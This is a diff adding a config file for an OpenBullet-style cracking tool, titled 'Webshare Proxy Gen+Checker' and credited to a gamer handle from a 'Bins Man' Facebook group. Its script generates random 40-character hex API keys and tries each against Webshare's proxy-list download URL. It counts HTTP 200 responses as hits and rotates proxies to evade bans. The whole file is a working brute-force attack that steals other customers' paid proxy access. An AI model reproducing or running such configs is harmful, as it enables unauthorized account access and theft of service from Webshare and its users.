@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "Webshare Proxy Gen+Checker",
+  "SuggestedBots": 25,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-23T22:17:36.8807972+04:00",
+  "AdditionalInfo": "Config Built For FB Group-> Bins Man Mulkata by YASHViR GAMiNG ♥",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> CAP "code" 
+
+REQUEST GET "https://proxy.webshare.io/proxy/list/download/<code>/-/http/username/direct/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid API key." 
+  KEYCHAIN Ban OR 
+    KEY "Powered by Symantec" 
+
+#Proxies PARSE "<HEADERS>" LR "=" "." -> CAP "Proxies" 
+
+#CODE FUNCTION Constant "https://proxy.webshare.io/proxy/list/download/<code>/-/http/username/direct/" -> CAP "CODE" 
+
+#AUTHOR FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By " 
+
